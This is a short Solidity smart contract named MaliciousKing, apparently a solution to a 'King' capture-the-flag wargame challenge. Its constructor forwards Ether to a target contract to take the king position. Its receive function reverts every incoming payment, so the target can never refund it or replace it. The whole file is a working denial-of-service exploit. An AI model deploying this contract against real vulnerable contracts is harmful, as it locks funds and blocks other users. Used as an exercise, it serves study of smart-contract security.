pragma solidity 0.8.0;
contract MaliciousKing {
    constructor(address _to) payable {
        address(_to).call{value: msg.value}();
    }

    receive() external payable {
        revert("Not accepting funds");
    }
}
